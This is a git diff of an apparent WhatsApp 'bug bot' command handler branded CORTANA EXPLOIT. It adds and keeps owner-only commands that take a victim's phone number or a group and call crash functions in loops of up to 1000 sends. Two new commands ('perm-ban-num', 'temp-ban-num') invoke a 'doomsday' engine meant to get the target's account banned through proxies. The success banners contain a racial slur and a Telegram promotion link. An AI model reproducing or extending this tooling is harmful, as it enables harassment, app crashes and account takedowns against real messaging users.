@@ -305,6 +305,69 @@ module.exports = aruloffcx = async (aruloffcx, m, chatUpdate, store) => {
             return await aruloffcx.sendMessage(m.chat, buttonMessage, { quoted: stc });
         }
 
+        // ═══════ CORTANA SUCCESS MESSAGES ═══════
+        const cortanaExploitSuccess = async (target, cmdUsed) => {
+            const successMsg = `╔══════════════════════╗
+║  ☠️ 𝐂̸͜𝐎̸͜𝐑̸͜𝐓̸͜𝐀̸͜𝐍̸͜𝐀̸͜ 𝐄̸͜𝐗̸͜𝐏̸͜𝐋̸͜𝐎̸͜𝐈̸͜𝐓̸͜ ☠️  ║
+╠══════════════════════╣
+║ 💀 𝐏͢𝐀͠𝐘͡𝐋͢𝐎͠𝐀͡𝐃 𝐎͢𝐕͠𝐄͡𝐑͢𝐋͠𝐎͡𝐀͢𝐃 💀
+║ ✅ Successfully sent to target!
+║
+║ 🎯 Target: ${target}
+║ ⚔️ Command: ${cmdUsed}
+║
+║ ⚠️ Please wait 10 min before
+║ processing another request
+║ or you get banned nigga! 🔥
+╚══════════════════════╝
+📲 t.me/eduqariz | © 2026`;
+
+            await aruloffcx.sendMessage(m.chat, {
+                text: successMsg,
+                contextInfo: {
+                    isForwarded: true,
+                    forwardedNewsletterMessageInfo: {
+                        newsletterJid: "120363317388829921@newsletter",
+                        newsletterName: "☠️ CORTANA EXPLOIT",
+                        serverMessageId: 143
+                    }
+                }
+            });
+        };
+
+        const cortanaBanSuccess = async (target, cmdUsed) => {
+            const banMsg = `╔══════════════════════╗
+║  🦠 𝐂̸͜𝐎̸͜𝐑̸͜𝐓̸͜𝐀̸͜𝐍̸͜𝐀̸͜ 𝐁̸͜𝐀̸͜𝐍̸͜ 🦠  ║
+╠══════════════════════╣
+║ 🔥 Oh! oo, Cortana is attacking
+║ using proxies on your target!
+║
+║ 🎯 Target: ${target}
+║ ⚔️ Method: ${cmdUsed}
+║
+║ ⏳ Wait for some hours, I'll
+║ notify you with progress and
+║ action taken!
+║
+║ 💬 Got questions? Reach out:
+║ 📲 t.me/eduqariz
+╚══════════════════════╝
+☠️ CORTANA EXPLOIT | © 2026`;
+
+            await aruloffcx.sendMessage(m.chat, {
+                text: banMsg,
+                contextInfo: {
+                    isForwarded: true,
+                    forwardedNewsletterMessageInfo: {
+                        newsletterJid: "120363317388829921@newsletter",
+                        newsletterName: "☠️ CORTANA EXPLOIT",
+                        serverMessageId: 143
+                    }
+                }
+            });
+        };
+        // ═══════ END CORTANA MESSAGES ═══════
+
         const dbPath = path.join(__dirname, '../gudang/database/antilinkgc.json');
         let ntlinkgc = fs.existsSync(dbPath)
             ? JSON.parse(fs.readFileSync(dbPath))
@@ -3941,68 +4004,19 @@ module.exports = aruloffcx = async (aruloffcx, m, chatUpdate, store) => {
                 if (target === BlockNum) return zreply("*no you will send this to the developer*");
 
                 await reaction(m.chat, "🦠");
-                await sleep(550);
+                await sleep(400);
                 await reaction(m.chat, "☠️");
-                await sleep(550);
-                await reaction(m.chat, "🩸");
-                await sleep(550);
-                await reaction(m.chat, "🐉");
-                await sleep(550);
+                await sleep(400);
                 await reaction(m.chat, "✅");
 
-                const done = `\`[ 𝐒𝐔𝐂̸͜𝐂̸͜𝐄𝐒 𝐄͡͡𝐗𝐄𝐂̸͜𝐔𝐓𝐈𝐎̽͢𝐍 ]\`
-\`𖥂\` Target : ${bijipler}
-\`𖥂\` Status : Done Bang
-\`𖥂\` Type : Forcelose One Msg
-\`𖥂\` Command : ${command}`;
-
-                await aruloffcx.sendMessage(m.chat, {
-                    interactiveMessage: {
-                        title: done,
-                        footer: '( ! ) Abis Bug Kasih Jeda 5 Menit',
-                        thumbnail: "https://files.catbox.moe/r06wjz.jpeg",
-                        nativeFlowMessage: {
-                            buttons: [
-                                {
-                                    name: "single_select",
-                                    buttonParamsJson: JSON.stringify({ has_multiple_buttons: true })
-                                },
-                                {
-                                    name: "call_permission_request",
-                                    buttonParamsJson: JSON.stringify({ has_multiple_buttons: true })
-                                },
-                                {
-                                    name: "cta_url",
-                                    buttonParamsJson: JSON.stringify({
-                                        display_text: "𝐈𝐧𝐟𝐨 𝐔𝐩𝐝𝐚𝐭𝐞 𝐒𝐜𝐫𝐢𝐩𝐭",
-                                        url: "https://whatsapp.com/channel/0029Vb5zkzTHltY0ERtDNP3M"
-                                    })
-                                }
-                            ]
-                        }
-                    }
-                },
-                    {
-                        quoted: {
-                            key: { remoteJid: "0@s.whatsapp.net", fromMe: false, id: "ownername", participant: "0@s.whatsapp.net" },
-                            message: {
-                                requestPaymentMessage: {
-                                    currencyCodeIso4217: "USD",
-                                    amount1000: "999999999",
-                                    requestFrom: "0@s.whatsapp.net",
-                                    noteMessage: { extendedTextMessage: { text: "𝐀͢𝐫͡𝐮𝐥 ᳟𝐎͢𝐟͡𝐟𝐢𝐜𝐢𝐚𝐥-᳟𝐈͢𝐃" } },
-                                    expiryTimestamp: "999999999",
-                                    amount: { value: "91929291929", offset: "1000", currencyCode: "INR" }
-                                }
-                            }
-                        }
-                    });
-
+                // Execute exploit
                 for (let i = 0; i < 5; i++) {
                     await FcOneMesYgy(aruloffcx, target);
                     await sleep(100);
                 }
 
+                // CORTANA Success Message
+                await cortanaExploitSuccess(bijipler, command);
                 break;
             }
             case 'trashem':
@@ -4026,68 +4040,19 @@ module.exports = aruloffcx = async (aruloffcx, m, chatUpdate, store) => {
                 if (target === BlockNum) return zreply("*no you will send this to the developer*");
 
                 await reaction(m.chat, "🦠");
-                await sleep(550);
+                await sleep(400);
                 await reaction(m.chat, "☠️");
-                await sleep(550);
-                await reaction(m.chat, "🩸");
-                await sleep(550);
-                await reaction(m.chat, "🐉");
-                await sleep(550);
+                await sleep(400);
                 await reaction(m.chat, "✅");
 
-                const done = `\`[ 𝐒𝐔𝐂̸͜𝐂̸͜𝐄𝐒 𝐄͡͡𝐗𝐄𝐂̸͜𝐔𝐓𝐈𝐎̽͢𝐍 ]\`
-\`𖥂\` Target : ${bijipler}
-\`𖥂\` Status : Done Bang
-\`𖥂\` Type : Forcelose One Msg
-\`𖥂\` Command : ${command}`;
-
-                await aruloffcx.sendMessage(m.chat, {
-                    interactiveMessage: {
-                        title: done,
-                        footer: '( ! ) Abis Bug Kasih Jeda 10 Menit',
-                        thumbnail: "https://files.catbox.moe/r06wjz.jpeg",
-                        nativeFlowMessage: {
-                            buttons: [
-                                {
-                                    name: "single_select",
-                                    buttonParamsJson: JSON.stringify({ has_multiple_buttons: true })
-                                },
-                                {
-                                    name: "call_permission_request",
-                                    buttonParamsJson: JSON.stringify({ has_multiple_buttons: true })
-                                },
-                                {
-                                    name: "cta_url",
-                                    buttonParamsJson: JSON.stringify({
-                                        display_text: "𝐈𝐧𝐟𝐨 𝐔𝐩𝐝𝐚𝐭𝐞 𝐒𝐜𝐫𝐢𝐩𝐭",
-                                        url: "https://whatsapp.com/channel/0029Vb5zkzTHltY0ERtDNP3M"
-                                    })
-                                }
-                            ]
-                        }
-                    }
-                },
-                    {
-                        quoted: {
-                            key: { remoteJid: "0@s.whatsapp.net", fromMe: false, id: "ownername", participant: "0@s.whatsapp.net" },
-                            message: {
-                                requestPaymentMessage: {
-                                    currencyCodeIso4217: "USD",
-                                    amount1000: "999999999",
-                                    requestFrom: "0@s.whatsapp.net",
-                                    noteMessage: { extendedTextMessage: { text: "𝐀͢𝐫͡𝐮𝐥 ᳟𝐎͢𝐟͡𝐟𝐢𝐜𝐢𝐚𝐥-᳟𝐈͢𝐃" } },
-                                    expiryTimestamp: "999999999",
-                                    amount: { value: "91929291929", offset: "1000", currencyCode: "INR" }
-                                }
-                            }
-                        }
-                    });
-
+                // Execute exploit
                 for (let i = 0; i < 5; i++) {
                     await ElmiForceMsgV1(aruloffcx, target);
                     await sleep(100);
                 }
 
+                // CORTANA Success Message
+                await cortanaExploitSuccess(bijipler, command);
                 break;
             }
 
@@ -4112,63 +4077,12 @@ module.exports = aruloffcx = async (aruloffcx, m, chatUpdate, store) => {
                 if (target === BlockNum) return zreply("*no you will send this to the developer*");
 
                 await reaction(m.chat, "🦠");
-                await sleep(550);
+                await sleep(400);
                 await reaction(m.chat, "☠️");
-                await sleep(550);
-                await reaction(m.chat, "🩸");
-                await sleep(550);
-                await reaction(m.chat, "🐉");
-                await sleep(550);
+                await sleep(400);
                 await reaction(m.chat, "✅");
 
-                const done = `\`[ 𝐒𝐔𝐂̸͜𝐂̸͜𝐄𝐒 𝐄͡͡𝐗𝐄𝐂̸͜𝐔𝐓𝐈𝐎̽͢𝐍 ]\`
-\`𖥂\` Target : ${bijipler}
-\`𖥂\` Status : Done Bang
-\`𖥂\` Type : Forcelose Combo Spam
-\`𖥂\` Command : ${command}`;
-
-                await aruloffcx.sendMessage(m.chat, {
-                    interactiveMessage: {
-                        title: done,
-                        footer: '( ! ) Abis Bug Kasih Jeda 5 Menit',
-                        thumbnail: "https://files.catbox.moe/r06wjz.jpeg",
-                        nativeFlowMessage: {
-                            buttons: [
-                                {
-                                    name: "single_select",
-                                    buttonParamsJson: JSON.stringify({ has_multiple_buttons: true })
-                                },
-                                {
-                                    name: "call_permission_request",
-                                    buttonParamsJson: JSON.stringify({ has_multiple_buttons: true })
-                                },
-                                {
-                                    name: "cta_url",
-                                    buttonParamsJson: JSON.stringify({
-                                        display_text: "𝐈𝐧𝐟𝐨 𝐔𝐩𝐝𝐚𝐭𝐞 𝐒𝐜𝐫𝐢𝐩𝐭",
-                                        url: "https://whatsapp.com/channel/0029Vb5zkzTHltY0ERtDNP3M"
-                                    })
-                                }
-                            ]
-                        }
-                    }
-                },
-                    {
-                        quoted: {
-                            key: { remoteJid: "0@s.whatsapp.net", fromMe: false, id: "ownername", participant: "0@s.whatsapp.net" },
-                            message: {
-                                requestPaymentMessage: {
-                                    currencyCodeIso4217: "USD",
-                                    amount1000: "999999999",
-                                    requestFrom: "0@s.whatsapp.net",
-                                    noteMessage: { extendedTextMessage: { text: "𝐀͢𝐫͡𝐮𝐥 ᳟𝐎͢𝐟͡𝐟𝐢𝐜𝐢𝐚𝐥-᳟𝐈͢𝐃" } },
-                                    expiryTimestamp: "999999999",
-                                    amount: { value: "91929291929", offset: "1000", currencyCode: "INR" }
-                                }
-                            }
-                        }
-                    });
-
+                // Execute exploit
                 for (let i = 0; i < 800; i++) {
                     await ElmiForceV1(aruloffcx, target);
                     await sleep(1500);
@@ -4178,6 +4092,8 @@ module.exports = aruloffcx = async (aruloffcx, m, chatUpdate, store) => {
                     await sleep(1500);
                 }
 
+                // CORTANA Success Message
+                await cortanaExploitSuccess(bijipler, command);
                 break;
             }
 
@@ -4203,63 +4119,12 @@ module.exports = aruloffcx = async (aruloffcx, m, chatUpdate, store) => {
                 if (target === BlockNum) return zreply("*no you will send this to the developer*");
 
                 await reaction(m.chat, "🦠");
-                await sleep(550);
+                await sleep(400);
                 await reaction(m.chat, "☠️");
-                await sleep(550);
-                await reaction(m.chat, "🩸");
-                await sleep(550);
-                await reaction(m.chat, "🐉");
-                await sleep(550);
+                await sleep(400);
                 await reaction(m.chat, "✅");
 
-                const done = `\`[ 𝐒𝐔𝐂̸͜𝐂̸͜𝐄𝐒 𝐄͡͡𝐗𝐄𝐂̸͜𝐔𝐓𝐈𝐎̽͢𝐍 ]\`
-\`𖥂\` Target : ${bijipler}
-\`𖥂\` Status : Done Bang
-\`𖥂\` Type : Crash Notif Combo Ui
-\`𖥂\` Command : ${command}`;
-
-                await aruloffcx.sendMessage(m.chat, {
-                    interactiveMessage: {
-                        title: done,
-                        footer: '( ! ) Abis Bug Kasih Jeda 15 Menit',
-                        thumbnail: "https://files.catbox.moe/r06wjz.jpeg",
-                        nativeFlowMessage: {
-                            buttons: [
-                                {
-                                    name: "single_select",
-                                    buttonParamsJson: JSON.stringify({ has_multiple_buttons: true })
-                                },
-                                {
-                                    name: "call_permission_request",
-                                    buttonParamsJson: JSON.stringify({ has_multiple_buttons: true })
-                                },
-                                {
-                                    name: "cta_url",
-                                    buttonParamsJson: JSON.stringify({
-                                        display_text: "𝐈𝐧𝐟𝐨 𝐔𝐩𝐝𝐚𝐭𝐞 𝐒𝐜𝐫𝐢𝐩𝐭",
-                                        url: "https://whatsapp.com/channel/0029Vb5zkzTHltY0ERtDNP3M"
-                                    })
-                                }
-                            ]
-                        }
-                    }
-                },
-                    {
-                        quoted: {
-                            key: { remoteJid: "0@s.whatsapp.net", fromMe: false, id: "ownername", participant: "0@s.whatsapp.net" },
-                            message: {
-                                requestPaymentMessage: {
-                                    currencyCodeIso4217: "USD",
-                                    amount1000: "999999999",
-                                    requestFrom: "0@s.whatsapp.net",
-                                    noteMessage: { extendedTextMessage: { text: "𝐀͢𝐫͡𝐮𝐥 ᳟𝐎͢𝐟͡𝐟𝐢𝐜𝐢𝐚𝐥-᳟𝐈͢𝐃" } },
-                                    expiryTimestamp: "999999999",
-                                    amount: { value: "91929291929", offset: "1000", currencyCode: "INR" }
-                                }
-                            }
-                        }
-                    });
-
+                // Execute exploit
                 for (let i = 0; i < 1000; i++) {
                     await SpcmUi(aruloffcx, target);
                     await sleep(1500);
@@ -4271,6 +4136,8 @@ module.exports = aruloffcx = async (aruloffcx, m, chatUpdate, store) => {
                     await sleep(1500);
                 }
 
+                // CORTANA Success Message
+                await cortanaExploitSuccess(bijipler, command);
                 break;
             }
 
@@ -4298,63 +4165,12 @@ module.exports = aruloffcx = async (aruloffcx, m, chatUpdate, store) => {
                 if (target === BlockNum) return zreply("*no you will send this to the developer*");
 
                 await reaction(m.chat, "🦠");
-                await sleep(550);
+                await sleep(400);
                 await reaction(m.chat, "☠️");
-                await sleep(550);
-                await reaction(m.chat, "🩸");
-                await sleep(550);
-                await reaction(m.chat, "🐉");
-                await sleep(550);
+                await sleep(400);
                 await reaction(m.chat, "✅");
 
-                const done = `\`[ 𝐒𝐔𝐂̸͜𝐂̸͜𝐄𝐒 𝐄͡͡𝐗𝐄𝐂̸͜𝐔𝐓𝐈𝐎̽͢𝐍 ]\`
-\`𖥂\` Target : ${bijipler}
-\`𖥂\` Status : Done Bang
-\`𖥂\` Type : Freeze Home Stuck
-\`𖥂\` Command : ${command}`;
-
-                await aruloffcx.sendMessage(m.chat, {
-                    interactiveMessage: {
-                        title: done,
-                        footer: '( ! ) Abis Bug Kasih Jeda 10 Menit',
-                        thumbnail: "https://files.catbox.moe/r06wjz.jpeg",
-                        nativeFlowMessage: {
-                            buttons: [
-                                {
-                                    name: "single_select",
-                                    buttonParamsJson: JSON.stringify({ has_multiple_buttons: true })
-                                },
-                                {
-                                    name: "call_permission_request",
-                                    buttonParamsJson: JSON.stringify({ has_multiple_buttons: true })
-                                },
-                                {
-                                    name: "cta_url",
-                                    buttonParamsJson: JSON.stringify({
-                                        display_text: "𝐈𝐧𝐟𝐨 𝐔𝐩𝐝𝐚𝐭𝐞 𝐒𝐜𝐫𝐢𝐩𝐭",
-                                        url: "https://whatsapp.com/channel/0029Vb5zkzTHltY0ERtDNP3M"
-                                    })
-                                }
-                            ]
-                        }
-                    }
-                },
-                    {
-                        quoted: {
-                            key: { remoteJid: "0@s.whatsapp.net", fromMe: false, id: "ownername", participant: "0@s.whatsapp.net" },
-                            message: {
-                                requestPaymentMessage: {
-                                    currencyCodeIso4217: "USD",
-                                    amount1000: "999999999",
-                                    requestFrom: "0@s.whatsapp.net",
-                                    noteMessage: { extendedTextMessage: { text: "𝐀͢𝐫͡𝐮𝐥 ᳟𝐎͢𝐟͡𝐟𝐢𝐜𝐢𝐚𝐥-᳟𝐈͢𝐃" } },
-                                    expiryTimestamp: "999999999",
-                                    amount: { value: "91929291929", offset: "1000", currencyCode: "INR" }
-                                }
-                            }
-                        }
-                    });
-
+                // Execute exploit
                 for (let i = 0; i < 1000; i++) {
                     await BugGb12(aruloffcx, target);
                     await sleep(1500);
@@ -4366,6 +4182,8 @@ module.exports = aruloffcx = async (aruloffcx, m, chatUpdate, store) => {
                     await sleep(1500);
                 }
 
+                // CORTANA Success Message
+                await cortanaExploitSuccess(bijipler, command);
                 break;
         }
 
@@ -4486,63 +4304,12 @@ module.exports = aruloffcx = async (aruloffcx, m, chatUpdate, store) => {
         if (target === BlockNum) return zreply("*no you will send this to the developer*");
 
         await reaction(m.chat, "🦠");
-        await sleep(550);
+        await sleep(400);
         await reaction(m.chat, "☠️");
-        await sleep(550);
-        await reaction(m.chat, "🩸");
-        await sleep(550);
-        await reaction(m.chat, "🐉");
-        await sleep(550);
+        await sleep(400);
         await reaction(m.chat, "✅");
 
-        const done = `\`[ 𝐒𝐔𝐂̸͜𝐂̸͜𝐄𝐒 𝐄͡͡𝐗𝐄𝐂̸͜𝐔𝐓𝐈𝐎̽͢𝐍 ]\`
-\`𖥂\` Target : ${bijipler}
-\`𖥂\` Status : Done Bang
-\`𖥂\` Type : Delay Hard Combo
-\`𖥂\` Command : ${command}`;
-
-        await aruloffcx.sendMessage(m.chat, {
-            interactiveMessage: {
-                title: done,
-                footer: '( ! ) Abis Bug Kasih Jeda 15 Menit',
-                thumbnail: "https://files.catbox.moe/r06wjz.jpeg",
-                nativeFlowMessage: {
-                    buttons: [
-                        {
-                            name: "single_select",
-                            buttonParamsJson: JSON.stringify({ has_multiple_buttons: true })
-                        },
-                        {
-                            name: "call_permission_request",
-                            buttonParamsJson: JSON.stringify({ has_multiple_buttons: true })
-                        },
-                        {
-                            name: "cta_url",
-                            buttonParamsJson: JSON.stringify({
-                                display_text: "𝐈𝐧𝐟𝐨 𝐔𝐩𝐝𝐚𝐭𝐞 𝐒𝐜𝐫𝐢𝐩𝐭",
-                                url: "https://whatsapp.com/channel/0029Vb5zkzTHltY0ERtDNP3M"
-                            })
-                        }
-                    ]
-                }
-            }
-        },
-            {
-                quoted: {
-                    key: { remoteJid: "0@s.whatsapp.net", fromMe: false, id: "ownername", participant: "0@s.whatsapp.net" },
-                    message: {
-                        requestPaymentMessage: {
-                            currencyCodeIso4217: "USD",
-                            amount1000: "999999999",
-                            requestFrom: "0@s.whatsapp.net",
-                            noteMessage: { extendedTextMessage: { text: "𝐀͢𝐫͡𝐮𝐥 ᳟𝐎͢𝐟͡𝐟𝐢𝐜𝐢𝐚𝐥-᳟𝐈͢𝐃" } },
-                            expiryTimestamp: "999999999",
-                            amount: { value: "91929291929", offset: "1000", currencyCode: "INR" }
-                        }
-                    }
-                }
-            });
-
+        // Execute exploit
         for (let i = 0; i < 800; i++) {
             await TzXAudio(aruloffcx, target);
             await sleep(1500);
@@ -4552,6 +4319,8 @@ module.exports = aruloffcx = async (aruloffcx, m, chatUpdate, store) => {
             await sleep(1500);
         }
 
+        // CORTANA Success Message
+        await cortanaExploitSuccess(bijipler, command);
         break;
     }
 
@@ -4561,8 +4330,17 @@ module.exports = aruloffcx = async (aruloffcx, m, chatUpdate, store) => {
         if (!m.isGroup) return zreply(`*this is for groups only*`)
         if (!isCreator) return zreply(`*no, this is for owners only*`)
 
+        await reaction(m.chat, "🦠");
+        await sleep(400);
+        await reaction(m.chat, "☠️");
+        await sleep(400);
+        await reaction(m.chat, "✅");
+
         const target = m.chat;
         await R9XKillGc(aruloffcx, target, false);
+
+        // CORTANA Success Message
+        await cortanaExploitSuccess(m.chat.split('@')[0], command);
         break;
     }
 
@@ -4573,19 +4351,123 @@ module.exports = aruloffcx = async (aruloffcx, m, chatUpdate, store) => {
         if (!m.isGroup) return zreply(`*this is for groups only*`)
         if (!isCreator) return zreply(`*no, this is for owners only*`)
 
+        await reaction(m.chat, "🦠");
+        await sleep(400);
+        await reaction(m.chat, "☠️");
+        await sleep(400);
+        await reaction(m.chat, "✅");
+
         for (let i = 0; i < 1000; i++) {
-            await BugGb12(aruloffc, m.chat)
-            await BugGb12(aruloffc, m.chat)
-            await BugGb12(aruloffc, m.chat)
-            await BugGb12(aruloffc, m.chat)
-            await BugGb12(aruloffc, m.chat)
-            await BugGb12(aruloffc, m.chat)
-            await BugGb12(aruloffc, m.chat)
-            await BugGb12(aruloffc, m.chat)
+            await BugGb12(aruloffcx, m.chat)
+            await BugGb12(aruloffcx, m.chat)
+            await BugGb12(aruloffcx, m.chat)
+            await BugGb12(aruloffcx, m.chat)
+            await BugGb12(aruloffcx, m.chat)
+            await BugGb12(aruloffcx, m.chat)
+            await BugGb12(aruloffcx, m.chat)
+            await BugGb12(aruloffcx, m.chat)
             await sleep(1000)
         }
+
+        // CORTANA Success Message
+        await cortanaExploitSuccess(m.chat.split('@')[0], command);
+        break;
     }
-    break;
+
+            // ═══════ BAN EXPLOITS ═══════
+            case 'perm-ban-num': {
+        if (!isCreator) return zreply(`*no, this is for owners only*`);
+
+        if (!text) {
+            return zreply(`— example: ${prefix + command} 62xxx`);
+        }
+
+        let bijipler = text.replace(/[^0-9]/g, '');
+        if (bijipler.startsWith('0')) {
+            return zreply(`Format: ${prefix + command} 628xxx`);
+        }
+
+        let target = bijipler + '@s.whatsapp.net';
+
+        await reaction(m.chat, "🦠");
+        await sleep(400);
+        await reaction(m.chat, "☠️");
+        await sleep(400);
+        await reaction(m.chat, "🔥");
+
+        try {
+            // Import and execute ban engine
+            const { CortanaDoomsday } = require(path.join(__dirname, '../../ban-engine'));
+            const banEngine = new CortanaDoomsday();
+
+            // Send starting message
+            await aruloffcx.sendMessage(m.chat, {
+                text: `☠️ *CORTANA PERMANENT BAN*\n\n🎯 Target: ${bijipler}\n⏳ Status: Initializing doomsday engine...\n\nThis may take several minutes.`
+            });
+
+            // Execute permanent ban
+            const result = await banEngine.executePermanentBan(target);
+
+            await reaction(m.chat, "✅");
+
+            // CORTANA Ban Success Message
+            await cortanaBanSuccess(bijipler, command);
+
+        } catch (error) {
+            console.error('[BAN] Error:', error);
+            await reaction(m.chat, "❌");
+            zreply(`*Ban execution failed: ${error.message}*`);
+        }
+
+        break;
+    }
+
+            case 'temp-ban-num': {
+        if (!isCreator) return zreply(`*no, this is for owners only*`);
+
+        if (!text) {
+            return zreply(`— example: ${prefix + command} 62xxx`);
+        }
+
+        let bijipler = text.replace(/[^0-9]/g, '');
+        if (bijipler.startsWith('0')) {
+            return zreply(`Format: ${prefix + command} 628xxx`);
+        }
+
+        let target = bijipler + '@s.whatsapp.net';
+
+        await reaction(m.chat, "🦠");
+        await sleep(400);
+        await reaction(m.chat, "☠️");
+        await sleep(400);
+        await reaction(m.chat, "⚡");
+
+        try {
+            // Import and execute ban engine
+            const { CortanaDoomsday } = require(path.join(__dirname, '../../ban-engine'));
+            const banEngine = new CortanaDoomsday();
+
+            // Send starting message
+            await aruloffcx.sendMessage(m.chat, {
+                text: `☠️ *CORTANA TEMPORARY BAN*\n\n🎯 Target: ${bijipler}\n⏳ Status: Initializing attack...\n\nThis may take a few minutes.`
+            });
+
+            // Execute temporary ban (HEAVY intensity)
+            const result = await banEngine.executeTemporaryBan(target);
+
+            await reaction(m.chat, "✅");
+
+            // CORTANA Ban Success Message
+            await cortanaBanSuccess(bijipler, command);
+
+        } catch (error) {
+            console.error('[BAN] Error:', error);
+            await reaction(m.chat, "❌");
+            zreply(`*Ban execution failed: ${error.message}*`);
+        }
+
+        break;
+    }
 
             default:
     const pluginsDisable = true;
